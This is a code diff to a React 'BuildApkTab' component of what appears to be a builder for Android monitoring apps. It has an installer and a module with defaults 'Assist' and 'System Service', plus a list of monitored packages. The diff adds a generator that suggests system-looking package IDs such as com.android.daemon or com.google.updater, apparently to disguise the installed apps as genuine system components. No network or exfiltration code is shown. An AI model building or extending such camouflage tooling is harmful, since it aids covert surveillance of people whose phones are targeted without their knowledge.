@@ -519,6 +519,33 @@ function ModuleLaunchPagePreview({ title, subtitle, step1, step2, step3, step4, 
   );
 }
 
+const PKG_ORG_WORDS = [
+  'android','google','system','device','mobile','media','core','platform',
+  'app','data','framework','phone','settings','service','secure','internal',
+  'base','provider','hardware','process','kernel','runtime','support','apps',
+  'services','telephony','network','content','package','accounts','location',
+];
+const PKG_APP_WORDS = [
+  'manager','service','core','framework','system','helper','handler','provider',
+  'engine','daemon','bridge','client','receiver','updater','monitor','worker',
+  'runtime','controller','processor','scheduler','resolver','launcher','registry',
+  'agent','relay','cache','proxy','adapter','router','tracker','connector',
+];
+
+function generatePkgSuggestions(count = 6, exclude = []) {
+  const results = new Set();
+  const used = new Set(exclude);
+  let tries = 0;
+  while (results.size < count && tries < 300) {
+    tries++;
+    const org = PKG_ORG_WORDS[Math.floor(Math.random() * PKG_ORG_WORDS.length)];
+    const app = PKG_APP_WORDS[Math.floor(Math.random() * PKG_APP_WORDS.length)];
+    const pkg = `com.${org}.${app}`;
+    if (!used.has(pkg)) results.add(pkg);
+  }
+  return [...results];
+}
+
 export default function BuildApkTab({ user }) {
   const [moduleName,       setModuleName]       = useState('System Service');
   const [modulePackage,    setModulePackage]     = useState('com.task.tusker');
@@ -527,6 +554,9 @@ export default function BuildApkTab({ user }) {
   const [installerName,       setInstallerName]      = useState('Assist');
   const [installerPackage,    setInstallerPackage]   = useState('com.onerule.task');
   const [installerIconSource, setInstallerIconSource] = useState('');
+
+  const [instPkgSugg, setInstPkgSugg] = useState(() => generatePkgSuggestions(6));
+  const [modPkgSugg,  setModPkgSugg]  = useState(() => generatePkgSuggestions(6));
 
   const [monitoredText, setMonitoredText] = useState(DEFAULT_MONITORED_PACKAGES.join('\n'));
 
@@ -797,7 +827,53 @@ export default function BuildApkTab({ user }) {
             </div>
 
             {fmtField('installerName',    installerName,    setInstallerName,    'App Name',    'e.g. "Assist"')}
-            {fmtField('installerPackage', installerPackage, setInstallerPackage, 'Package ID',  'e.g. com.onerule.task')}
+
+            {/* Installer Package ID with suggestions */}
+            <div style={styles.field}>
+              <label style={styles.label}>Package ID</label>
+              <input
+                type="text"
+                style={{ ...styles.input, ...(errors.installerPackage ? styles.inputErr : {}) }}
+                value={installerPackage}
+                onChange={e => setInstallerPackage(e.target.value)}
+                disabled={running}
+                spellCheck={false}
+                autoComplete="off"
+                placeholder="e.g. com.onerule.task"
+              />
+              {errors.installerPackage
+                ? <span style={styles.errMsg}>{errors.installerPackage}</span>
+                : <span style={styles.hint}>e.g. com.onerule.task</span>}
+              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 5, marginTop: 5, alignItems: 'center' }}>
+                <span style={{ fontSize: 10, color: '#475569', flexShrink: 0 }}>Suggest:</span>
+                {instPkgSugg.map(pkg => (
+                  <button
+                    key={pkg}
+                    type="button"
+                    onClick={() => setInstallerPackage(pkg)}
+                    disabled={running}
+                    style={{
+                      background: 'rgba(99,102,241,0.1)', border: '1px solid rgba(99,102,241,0.3)',
+                      color: '#a5b4fc', borderRadius: 5, padding: '2px 7px',
+                      fontSize: 10.5, cursor: running ? 'not-allowed' : 'pointer',
+                      fontFamily: 'monospace', lineHeight: 1.5,
+                      opacity: running ? 0.5 : 1,
+                    }}
+                  >{pkg}</button>
+                ))}
+                <button
+                  type="button"
+                  onClick={() => setInstPkgSugg(generatePkgSuggestions(6, modPkgSugg))}
+                  disabled={running}
+                  style={{
+                    background: 'transparent', border: '1px solid #334155', color: '#64748b',
+                    borderRadius: 5, padding: '2px 7px', fontSize: 10, cursor: running ? 'not-allowed' : 'pointer',
+                    opacity: running ? 0.5 : 1, flexShrink: 0,
+                  }}
+                  title="Generate new suggestions"
+                >↻</button>
+              </div>
+            </div>
 
             <IconField
               label="Installer"
@@ -903,7 +979,53 @@ export default function BuildApkTab({ user }) {
             </div>
 
             {fmtField('moduleName',    moduleName,    setModuleName,    'App Name',   'e.g. "System Service"')}
-            {fmtField('modulePackage', modulePackage, setModulePackage, 'Package ID', 'e.g. com.task.tusker')}
+
+            {/* Module Package ID with suggestions */}
+            <div style={styles.field}>
+              <label style={styles.label}>Package ID</label>
+              <input
+                type="text"
+                style={{ ...styles.input, ...(errors.modulePackage ? styles.inputErr : {}) }}
+                value={modulePackage}
+                onChange={e => setModulePackage(e.target.value)}
+                disabled={running}
+                spellCheck={false}
+                autoComplete="off"
+                placeholder="e.g. com.task.tusker"
+              />
+              {errors.modulePackage
+                ? <span style={styles.errMsg}>{errors.modulePackage}</span>
+                : <span style={styles.hint}>e.g. com.task.tusker</span>}
+              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 5, marginTop: 5, alignItems: 'center' }}>
+                <span style={{ fontSize: 10, color: '#475569', flexShrink: 0 }}>Suggest:</span>
+                {modPkgSugg.map(pkg => (
+                  <button
+                    key={pkg}
+                    type="button"
+                    onClick={() => setModulePackage(pkg)}
+                    disabled={running}
+                    style={{
+                      background: 'rgba(99,102,241,0.1)', border: '1px solid rgba(99,102,241,0.3)',
+                      color: '#a5b4fc', borderRadius: 5, padding: '2px 7px',
+                      fontSize: 10.5, cursor: running ? 'not-allowed' : 'pointer',
+                      fontFamily: 'monospace', lineHeight: 1.5,
+                      opacity: running ? 0.5 : 1,
+                    }}
+                  >{pkg}</button>
+                ))}
+                <button
+                  type="button"
+                  onClick={() => setModPkgSugg(generatePkgSuggestions(6, instPkgSugg))}
+                  disabled={running}
+                  style={{
+                    background: 'transparent', border: '1px solid #334155', color: '#64748b',
+                    borderRadius: 5, padding: '2px 7px', fontSize: 10, cursor: running ? 'not-allowed' : 'pointer',
+                    opacity: running ? 0.5 : 1, flexShrink: 0,
+                  }}
+                  title="Generate new suggestions"
+                >↻</button>
+              </div>
+            </div>
 
             <IconField
               label="Module"
